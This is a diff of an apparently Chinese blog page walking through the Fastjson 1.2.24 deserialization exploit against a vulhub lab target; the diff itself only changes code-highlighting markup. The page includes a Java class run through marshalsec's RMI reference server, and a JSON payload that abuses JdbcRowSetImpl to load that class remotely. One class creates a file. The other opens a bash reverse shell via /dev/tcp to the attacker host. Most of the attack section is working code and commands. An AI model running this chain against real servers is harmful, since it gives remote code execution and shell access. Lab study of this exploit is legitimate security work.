@@ -18,7 +18,7 @@
   localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
   translate: undefined,
   noticeOutdate: undefined,
-  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  highlight: undefined,
   copy: {
     success: '复制成功',
     error: '复制错误',
@@ -163,33 +163,73 @@
 <p><img src="/../image/image-20240726204004493-1723344210785-4.png" alt="image-20240726204004493"></p>
 <p>可以看到成功访问</p>
 <h3 id="1-远程创建文件"><a href="#1-远程创建文件" class="headerlink" title="1.远程创建文件"></a>1.远程创建文件</h3><p>在攻击机上创建一个TouchFile.java文件</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javac TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;touch&quot;</span>, <span class="string">&quot;/tmp/success&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="java">// javac TouchFile.java
+import java.lang.Runtime;
+import java.lang.Process;
 
+public class TouchFile &#123;
+    static &#123;
+        try &#123;
+            Runtime rt = Runtime.getRuntime();
+            String[] commands = &#123;&quot;touch&quot;, &quot;/tmp/success&quot;&#125;;
+            Process pc = rt.exec(commands);
+            pc.waitFor();
+        &#125; catch (Exception e) &#123;
+            // do nothing
+        &#125;
+    &#125;
+&#125;
+</code></pre>
 <p>编译.java文件，生成.class文件。<strong>特别注意：要保证java和javac的版本一致，且都是1.8的版本</strong>再用python搭建一个简易服务器</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m http.server 9966</span><br></pre></td></tr></table></figure>
-
+<pre><code>python -m http.server 9966
+</code></pre>
 <p><img src="/../image/image-20240726225243350-1723344210785-2.png" alt="image-20240726225243350"></p>
 <p>接下来使用marshalsec项目，启动RMI服务，监听9999端口并加载远程类TouchFile.class：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.RMIRefServer &quot;http://192.168.174.160:9966/#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure>
-
+<pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.RMIRefServer &quot;http://192.168.174.160:9966/#TouchFile&quot; 9999
+</code></pre>
 <p><img src="/../image/image-20240726231034594-1723344210785-3.png" alt="image-20240726231034594"></p>
 <p>刷新靶场(<a href="http://192.168.174.137:8090)的链接，抓包后改GET包为POST包（右键-&gt;变更请求方法），然后在发送的请求数据包中输入以下payload：">http://192.168.174.137:8090)的链接，抓包后改GET包为POST包（右键-&gt;变更请求方法），然后在发送的请求数据包中输入以下payload：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 169</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">&#123;</span><br><span class="line">  	&quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.174.160:9999/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre><code>Content-Type: application/json
+Content-Length: 169
 
+ 
+&#123;
+      &quot;b&quot;:&#123;
+        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+        &quot;dataSourceName&quot;:&quot;rmi://192.168.174.160:9999/TouchFile&quot;,
+        &quot;autoCommit&quot;:true
+    &#125;
+&#125;
+</code></pre>
 <p><img src="/../image/image-20240726231428714-1723344210784-1.png" alt="image-20240726231428714"></p>
 <p>返回500就算成功了，也可以看下rmi监听的信息和http服务器的信息</p>
 <p><img src="/../image/image-20240726231522006-1723344210785-7.png" alt="image-20240726231522006"></p>
 <p><img src="/../image/image-20240726231533481-1723344210785-6.png" alt="image-20240726231533481"></p>
 <p>还可以去容器里看看有没有创建文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it 容器id bash</span><br></pre></td></tr></table></figure>
-
+<pre><code>docker exec -it 容器id bash
+</code></pre>
 <p>好像没有，但切换到靶机里就可以了</p>
 <p><img src="/../image/image-20240726232517434-1723344210785-5.png" alt="image-20240726232517434"></p>
 <p><img src="/../image/image-20240726232623558-1723344210785-8.png" alt="image-20240726232623558"></p>
 <p>应该是容器网络没配置好</p>
 <h3 id="2-反弹shell"><a href="#2-反弹shell" class="headerlink" title="2.反弹shell"></a>2.反弹shell</h3><p>基本思路和前面是一模一样的，改一下恶意站点的java代码就行了。在vulhub下的fastjson 1.2.24文件夹下保存以下代码为GetShell.java文件:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// javac GetShell.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.174.160/8888 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+<pre><code class="java">// javac GetShell.java
+import java.lang.Runtime;
+import java.lang.Process;
+ 
+public class Shell &#123;
+    static &#123;
+        try &#123;
+            Runtime rt = Runtime.getRuntime();
+            String[] commands = &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/192.168.174.160/8888 0&gt;&amp;1&quot;&#125;;
+            Process pc = rt.exec(commands);
+            pc.waitFor();
+        &#125; catch (Exception e) &#123;
+            // do nothing
+        &#125;
+    &#125;
+&#125;
+</code></pre>
 <p>然后抓包，把TouchFile改成Shell即可</p>
 <p><img src="/../image/image-20240726233239723-1723344210785-9.png" alt="image-20240726233239723"></p>
 <p><img src="/../image/image-20240726233205520-1723344210785-10.png" alt="image-20240726233205520"></p>
